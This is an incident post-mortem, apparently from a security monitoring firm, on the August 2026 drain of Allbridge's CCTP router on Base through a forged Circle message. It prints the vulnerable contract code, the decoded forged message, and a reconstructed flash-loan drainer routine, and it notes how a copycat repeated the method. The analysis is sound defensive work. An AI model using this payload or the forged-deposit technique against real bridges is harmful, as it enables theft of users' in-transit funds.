# 🌉 Allbridge CCTP Router Drained for $191K via Forged Circle Message

- **Source URL:** https://defimon.xyz/blog/allbridge-hack-august-2026
- **Fetched:** 2026-11-15
- **Channel:** @defendor_eng
- **Telegram message:** https://t.me/defendor_eng/1996 (id 1996)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
baseAugust 19, 2026-$191K

Allbridge's new CCTP router on Base credited a forged Circle message as a real deposit. The attacker booked a phantom $1M, flash-loaned the shortfall and took the router's entire 191,156 USDC.

On August 19, 2026 at 01:47 UTC, an attacker drained 191,156 USDC from Allbridge's CCTP router on Base by redeeming a Circle message that moved no money. Allbridge's `CCTPTokenMessenger` relayed an attested cross-chain message and then credited the amount written inside it as a spendable deposit, without ever checking that USDC had been minted to the bridge. Circle's `MessageTransmitterV2` exposes a generic `sendMessage` primitive that attests arbitrary payloads with no burn and no mint attached, so anyone could author a message shaped like a deposit and have Circle sign it. The attacker declared 1,000,000 USDC, received nothing, and the router paid out 999,000 USDC anyway. Holding no capital, they flash-loaned 808,844 USDC from Aave to top the router up to the declared figure, took the payout, repaid the loan, and netted 189,752 USDC. The message they redeemed had been created on Polygon 24 days earlier and sat attested until the router held enough to be worth taking. The strike landed six seconds after a legitimate 191,112 USDC inflow arrived, before the bridge's own relayer could forward it to its recipient.

The vulnerability is a single missing check in `CCTPTokenMessenger.receiveCctpMessage` on Base at [0xf9b710E4](https://basescan.org/address/0xf9b710e427bf4d93598e0f80a84de22c7ad9b577). The function relays a message to Circle's `MessageTransmitterV2`, then books a credit keyed to the hash carried in the message's hook data, using the amount field read out of the message body:

```
function receiveCctpMessage(bytes calldata message, bytes calldata attestation) external {
    require(message.length >= 408, "Message too short");
    uint32 sourceDomain = uint32(bytes4(message[4:8]));
    bytes32 destCaller  = bytes32(message[108:140]);
    uint256 amount      = uint256(bytes32(message[216:248]));   // attacker-authored
    uint256 feeExecuted = uint256(bytes32(message[312:344]));
    bytes32 sourceSender = bytes32(message[248:280]);           // attacker-authored
    bytes32 messageHash  = bytes32(message[376:408]);           // attacker-authored
    require(destCaller == bytes32(uint256(uint160(address(this)))), "Invalid destination caller");
    uint32 sourceChainId = domainToChainId[sourceDomain];
    require(sourceChainId != 0, "Unknown source domain");
    require(sourceSender == remoteTokenMessengers[sourceChainId], "Invalid remote sender");
    bool success = IMessageTransmitter(MESSAGE_TRANSMITTER).receiveMessage(message, attestation);
    require(success, "CCTP receiveMessage failed");
    receivedMessages[messageHash] = amount - feeExecuted;       // no balance check
    emit MessageReceived(messageHash);
}
```
Nothing in that function observes a token balance. The contract asks Circle whether the message is authentic, and Circle answers truthfully that it is, because Circle signed it. What Circle does not assert, and what the contract assumes, is that the message caused a mint.

The one guard that looks like a guard is not one. `sourceSender` is read from `message[248:280]`, which is the `messageSender` field of the message body, and the body of a generic message is written entirely by whoever calls `sendMessage`. The comparison is therefore between an attacker-chosen field and `remoteTokenMessengers[sourceChainId]`, a value anyone can read on-chain. The attacker read it and copied it in. For source domain 7, Allbridge maps to its internal chain 5 and expects `0xdac2959b638247ab586f6c3ffcfc9c352d3aae5c`, which is exactly the value the forged body carried.

The message itself was created on Polygon on July 25, 2026 at 20:32:55 UTC in [transaction 0x2a88d797](https://polygonscan.com/tx/0x2a88d79756b4547b33fea7b3c1420793680e2b8952bef4c65e99879e16b22140), a plain call to `MessageTransmitterV2.sendMessage`. That transaction emitted a `MessageSent` event and burned nothing. Circle's attestation service assigned it nonce `0xaa0d61b8…156322` and signed it. Decoded, the body is shaped like a CCTP burn message and is empty where a real burn would carry data:

```
version           0x00000001
sourceDomain      7            (Polygon)
destinationDomain 6            (Base)
sender            0x2419…360e  (attacker EOA on Polygon)
recipient         0xb6fb…16c0  (attacker contract on Base, NOT Circle's TokenMessenger)
destinationCaller 0xf9b7…b577  (Allbridge's messenger, so only it can redeem)
--- body ---
burnToken         0x0
mintRecipient     0x0
amount            0xe8d4a51000 (1,000,000 USDC)
messageSender     0xdac2…ae5c  (copied from remoteTokenMessengers[5])
maxFee            0
feeExecuted       0
hookData          0xe15a0288…c52e
```
The `recipient` field is where the fraud becomes mechanical. `MessageTransmitterV2.receiveMessage` dispatches the body to whatever address sits in `recipient`. On a genuine transfer that is Circle's `TokenMessengerV2`, which mints. Here it is the attacker's own contract, which returns success and mints nothing. Allbridge's messenger never reads that field, so it cannot tell the two cases apart. This is the false-deposit pattern that recurs across [bridge exploits](https://defimon.xyz/blog/bridge-exploits-explained): the destination contract treats proof that a message was sent as proof that value moved.

The `hookData` field is the second half of the design. Allbridge uses it to carry its own message hash, and the `Router` at [0xaA119F74](https://basescan.org/address/0xaa119f7442ecc28b9a8f236707ada8362cff24ff) recomputes that hash from the parameters a caller supplies and pays out if the messenger has a nonzero credit under it:

```
bytes32 messageHash =
    _calculateMessageHash(_nonce, recipient, destinationToken, normalizedAmount, sourceChain, CHAIN_ID);
require(!usedMessages[messageHash], "Message already used");
uint256 receivedAmount = ITokenMessenger(tokenMessengersAddr).receivedTokenAmount(messageHash);
require(receivedAmount > 0, "Message not received");        // the only solvency test
usedMessages[messageHash] = true;
uint256 actualAmount   = _denormalize(normalizedAmount, _getDecimals(intermediaryToken));
uint256 fee            = (actualAmount * feeBp) / BP_DENOMINATOR;
uint256 amountAfterFee = actualAmount - fee;
withdrawableAmount[intermediaryToken] += (receivedAmount - amountAfterFee);
IERC20(intermediaryToken).safeTransfer(recipientAddr, amountAfterFee);
```
Because `_calculateMessageHash` is a pure `keccak256` over caller-supplied values, the attacker computed the hash offline for the parameters they wanted, embedded it in `hookData`, and had Circle sign it. The tuple `(nonce 12345, recipient 0xb6fb…16c0, token USDC, normalizedAmount 1e15, sourceChain 12345, CHAIN_ID 9)` hashes to `0xe15a0288fb4a60804a866655fdf08a6d3e51c3ca58f5d400e8620e7069aac52e`, the exact value in the forged body. Allbridge normalizes to nine decimals internally, so 1e15 denormalizes to 1e12, or 1,000,000 USDC, and the 10 basis point fee leaves 999,000 USDC payable.

The attack transaction is [0x9f906fcd](https://basescan.org/tx/0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8), at block 50157345, and its structure is what Defimon detected it on. It calls a harness contract deployed 25 days earlier at [0xb6fbDFA5](https://basescan.org/address/0xb6fbdfa5f3cbeb139d4cce86d92f4ac8687b16c0), which deploys a logic contract at [0xe9edf158](https://basescan.org/address/0xe9edf1582ed9520f7149669d9c6bf3276b02477e) whose constructor relays the forged message, then delegatecalls into it. Running the exploit from creation code is what raised the `exploit_in_initcode` alert: the drainer never exists as a deployed contract anyone could have read in advance, and by the time it has an address it has already executed. Reconstructed from the deployed bytecode, the payload is a balance-topping routine:

```
// run(1_000_000): declared value is 1e12 in USDC units
function run(uint256 target) external {
    uint256 amount     = target * 1e6;                      // 1e12 = 1,000,000 USDC
    uint256 routerBal  = USDC.balanceOf(ROUTER);
    if (routerBal < amount) {
        // borrow only the shortfall
        AAVE_POOL.flashLoanSimple(address(this), USDC, amount - routerBal, abi.encode(amount), 0);
    } else {
        _redeem(amount);
    }
}
function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata params)
    external returns (bool)
{
    require(msg.sender == address(AAVE_POOL));
    IERC20(asset).transfer(ROUTER, amount);                 // top the router up to 1,000,000
    _redeem(abi.decode(params, (uint256)));                 // take 999,000 back out
    IERC20(asset).approve(address(AAVE_POOL), amount + premium);
    return true;
}
function _redeem(uint256 amount) internal {
    Router(ROUTER).receiveToken(
        amount * 1000,                                      // 1e15 normalized
        12345, 12345, bytes32(USDC), bytes32(address(this)),
        address(0), MESSENGER, 0
    );
}
```
The router never held a million dollars, so the [flash loan](https://defimon.xyz/blog/flash-loan-attacks-explained) exists only to make the balance match the number the attacker had already declared. Aave supplied 808,844 USDC against a router balance of 191,156, the router paid 999,000 USDC to the attacker's contract, and 809,248 USDC went back to Aave including a 404 premium. Profit reduces to a clean identity: the router's balance, minus the 1,000 USDC fee the router keeps on its own books, minus the flash loan premium. That came to 189,752 USDC, and it emptied the contract.

Timing was the only part that required patience. The router is a pass-through, not a liquidity pool, and it held about 44 USDC at block 50157341. At block 50157342, 01:47:11 UTC, the bridge's relayer redeemed a genuine CCTP transfer and 191,112 USDC was minted into the router for onward payment to a real recipient. Three blocks and six seconds later the attacker took it. The relayer never got to forward it, and submitted nothing further.

All August 19, 2026 times are UTC.

Incident timeline · UTC

Alert delivered

01:47

3h 36m

no response

Protocol paused

05:22

Apr 28CCTP module deployed and registered on Base12:08 UTC deploy, 12:36 UTC registerTokenMessenger · Router [0xaA11…24fF](https://basescan.org/address/0xaa119f7442ecc28b9a8f236707ada8362cff24ff) + messenger [0xf9b7…b577](https://basescan.org/address/0xf9b710e427bf4d93598e0f80a84de22c7ad9b577)bug live

May 6First production message relayed16:29 UTC · relayer [0x5883…5E2E](https://basescan.org/address/0x58831c11adc30de780ba6ac7b9a593600ae75e2e) begins routing live USDC transfers

Jul 25Reconnaissance: four helper deployments, six forged sendMessage calls08:07 to 20:40 UTC · nonce-aligned CREATE puts identical contracts on Base, Ethereum and Polygon

Jul 25The message that would be used is created on Polygon20:32:55 UTC · generic sendMessage, zero USDC burned, declared amount 1,000,000 USDC · Circle attests itwaits 24 days

01:47:11Legitimate CCTP inflow mints into the Routerblock 50157342 · a real user transfer awaiting payout+191,112router holds 191,156

01:47:17Forged message redeemed · [block 50157345](https://basescan.org/tx/0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8) · Defimon alert fires808,844 flash-loaned from Aave, router pays 999,000, loan repaid with a 404 premium · flagged as exploit\_in\_initcode, the drainer ran from contract creation code−189,7526 seconds after the mint

02:12:01Copycat [0xf33f…4da0](https://basescan.org/address/0xf33f35046afd68ed900a3c7fbd9a1828d2464da0) repeats the techniqueown forged message from Ethereum, fast attestation, sized to the router's exact remaining balance−999

02:46:31Same copycat takes the dustsecond forged message, this one from Polygon · router left holding 0.001 USDC−0.999

05:15:52Allbridge begins deregistering messengersArbitrum first: registerTokenMessenger(..., false) on both the CCTP and LayerZero OFT modules

05:22:51Base messenger deregistered3 hours 36 minutes after the drain · Polygon follows at 05:28 · kill switch, not a fix

06:28:35Attacker withdraws proceeds from the exploit contract189,752 USDC to [0x2419…360e](https://basescan.org/address/0x2419432344b0b892e592b2601b98eae702ba360e), an EOA delegated to MetaMask's EIP-7702 smart account

06:34–06:37Swapped out through Jumper and Mayan Swiftthree batched calls · settled as about 99 ETH on Ethereum at the same address, unmoved sinceexit complete in 6 min

The confirmed loss is 191,156 USDC, the router's entire balance. It splits into 189,752 USDC taken by the attacker and 404 USDC paid to Aave as the flash loan premium, plus the 1,000 USDC fee the router kept on that payout, which a copycat came back for in two later transactions. The router's internal ledger still records 1,045 USDC of `withdrawableAmount` in accrued fees that the contract no longer holds.

Because the router carries no standing liquidity, the loss fell almost entirely on one in-flight transfer. The 191,112 USDC minted six seconds before the attack belonged to a user mid-bridge, and it was taken before the relayer could deliver it. That is a materially different exposure profile from a pooled bridge: there is little to steal most of the time, and the ceiling on any single theft is whatever happens to be crossing at that moment, capped by the attacker's declared figure.

The copycat at [0xf33f3504](https://basescan.org/address/0xf33f35046afd68ed900a3c7fbd9a1828d2464da0) is the more instructive part of the impact. Within 25 minutes of the first drain, a second party had authored their own forged message, obtained a Circle attestation using the fast-finality path from Ethereum, and sized their claim to the router's exact remaining 1,000 USDC. Thirty-four minutes after that they came back from Polygon for the remaining 1 USDC. Reproducing the exploit from the public transaction took under half an hour, which is the practical measure of how exposed the contract was for the three and a half hours it stayed registered.

The same `Router` and `CCTPTokenMessenger` bytecode is deployed on Polygon and Arbitrum at the same addresses, alongside `OFTTokenMessenger` contracts serving the LayerZero path. All of them now hold zero USDC and all have been deregistered, so the exposure elsewhere was closed rather than exploited. The wider cost is that the pool-free bridge Allbridge was migrating toward is offline on every chain it had reached.

This is Allbridge's third publicly identified exploit, and the first that did not involve a liquidity pool.

In April 2023, an attacker drained roughly $573,000 from Allbridge's BUSD and USDT pools on BNB Chain. Acting as both liquidity provider and swapper in the same transaction, they moved the pool's reserve ratio and then withdrew against the price their own swap had just created. Allbridge offered a bounty, recovered about $465,000, and reworked how liquidity and withdrawals were calculated.

On July 19, 2026, the same class of bug returned on Solana for $1.65 million. The attacker borrowed about $1.12 million of USDC from Kamino, ran a series of same-asset swaps through the USDC and USDT pools to skew the ratio, and withdrew at the manipulated rate. The imbalance fix shipped after 2023 had not covered the Solana deployment. The team said it stopped the bridge 30 minutes after the vulnerability was found, described liquidity pools as "a kind of constant magnet for hackers," and confirmed it was "already working on relaunching Core without liquidity pools," with transfers routed through Circle's CCTP and LayerZero instead.

The contracts drained on Base are that replacement, a new Allbridge Next deployment separate from the Core contracts. The `Router` and `CCTPTokenMessenger` pair went live on April 28, 2026 and carried its first production transfer on May 6, and the team pointed to the CCTP route in July as the safe path still running while the pools were paused: "We have the option to send funds not through liquidity pools, but via Circle's CCTP protocol, without enabling the pools." Removing the pools removed the pool math bug and the flash loan leverage that came with it. It replaced them with a trust assumption about what an attested message proves, and that assumption failed one month later.

Allbridge's response was containment across every chain rather than a patch. Between 05:15:52 and 05:28:06 UTC, three and a half hours after the drain, the protocol owner at [0x6588FB6e](https://basescan.org/address/0x6588fb6e92d9fa540534e7920e07f9c8627a4ce1) called `registerTokenMessenger(messenger, false)` on the Arbitrum, Base and Polygon routers, unregistering the CCTP messengers and the LayerZero OFT messengers alongside them, and revoking each contract's USDC allowance in the process. A final Arbitrum OFT messenger was deregistered at 09:31 UTC. Every router now reports `tokenMessengers[...] = false`, the Polygon and Arbitrum routers hold no USDC, and the Base router holds 0.001 USDC.

That closes the payout path, because `receiveToken` reverts on an unregistered messenger. It does not fix anything. `receiveCctpMessage` is unchanged, `receivedMessages[0xe15a0288…c52e]` still reads 1,000,000,000,000, and any redeployment that registers a messenger built from this code reopens the same door. A correct fix has to make the credit conditional on an observed balance change rather than on a number inside the message, for example by measuring the router's token balance across the `receiveMessage` call, or by requiring that `message[76:108]` name Circle's `TokenMessengerV2` so that only messages capable of minting are ever credited.

The three and a half hour window is the part worth measuring. Defimon's alert fired as the transaction landed. The exploit was public and self-describing from that moment, and a second actor had reproduced it within 25 minutes. Detection was not the constraint; the open question is how quickly an owner key can act on a [machine-readable exploit feed](https://defimon.xyz/docs/websocket_attack_message). In this incident the remaining balance after the first drain was only about $1,000, so the delay cost little. On a router that had just received a larger transfer, the same delay would have cost the full amount.

Recovery prospects are poor. The attacker withdrew 189,752 USDC to their own address at 06:28:35 UTC, more than an hour after the messengers had been unregistered, then routed it through Jumper and Mayan Swift in three transactions between 06:34 and 06:37, receiving about 99 ETH on Ethereum at the same address. Those funds have not moved since. Notably, the attacker used entirely ordinary retail tooling: the withdrawing account is an EOA carrying an EIP-7702 delegation to MetaMask's `EIP7702StatelessDeleGator`, and each swap was a batched `execute` call of the kind that wallet emits by default.

Allbridge has not published a statement about the incident as of August 20, 2026, and the exploit had not been reported publicly at the time of writing. Everything above is reconstructed from the transactions and from Allbridge's own verified contract source on Basescan.

- Attack transaction: [0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8](https://basescan.org/tx/0x9f906fcd8fceaa6745e8d1c004861dcfa9b5e6a893fe1e8c5d0013a4e982e6a8)
- Attacker: [0x2419432344b0b892e592b2601b98eae702ba360e](https://basescan.org/address/0x2419432344b0b892e592b2601b98eae702ba360e)
- Exploit harness contract: [0xb6fBDFA5F3CBEB139D4ccE86D92F4ac8687B16c0](https://basescan.org/address/0xb6fbdfa5f3cbeb139d4cce86d92f4ac8687b16c0)
- Exploit logic contract deployed in the attack: [0xe9edf1582ed9520f7149669d9c6bf3276b02477e](https://basescan.org/address/0xe9edf1582ed9520f7149669d9c6bf3276b02477e)
- Victim, Allbridge Router: [0xaA119F7442Ecc28b9a8f236707aDa8362cFF24fF](https://basescan.org/address/0xaa119f7442ecc28b9a8f236707ada8362cff24ff)
- Vulnerable CCTPTokenMessenger: [0xf9b710E427bf4d93598e0F80A84dE22C7Ad9b577](https://basescan.org/address/0xf9b710e427bf4d93598e0f80a84de22c7ad9b577)
- Forged message creation on Polygon: [0x2a88d79756b4547b33fea7b3c1420793680e2b8952bef4c65e99879e16b22140](https://polygonscan.com/tx/0x2a88d79756b4547b33fea7b3c1420793680e2b8952bef4c65e99879e16b22140)
- Copycat: [0xf33f35046afd68eD900A3C7fbd9a1828d2464da0](https://basescan.org/address/0xf33f35046afd68ed900a3c7fbd9a1828d2464da0)
- Allbridge relayer: [0x58831c11adC30de780Ba6ac7B9a593600ae75E2E](https://basescan.org/address/0x58831c11adc30de780ba6ac7b9a593600ae75e2e)
- Allbridge owner, messenger deregistration: [0x6588FB6e92d9fa540534e7920E07F9c8627a4Ce1](https://basescan.org/address/0x6588fb6e92d9fa540534e7920e07f9c8627a4ce1)
- Base messenger deregistration transaction: [0xdf2c5020a5fe95325c005b64c0ac3e898b68fbbe972b8c930dcebc33d04bc6d0](https://basescan.org/tx/0xdf2c5020a5fe95325c005b64c0ac3e898b68fbbe972b8c930dcebc33d04bc6d0)

Defimon detects exploits on major chains before they execute and streams them to you: human-readable alerts in Telegram, or structured JSON over WebSocket for your own systems.

websocket $200 / mo · signals $50 / mo · channel free
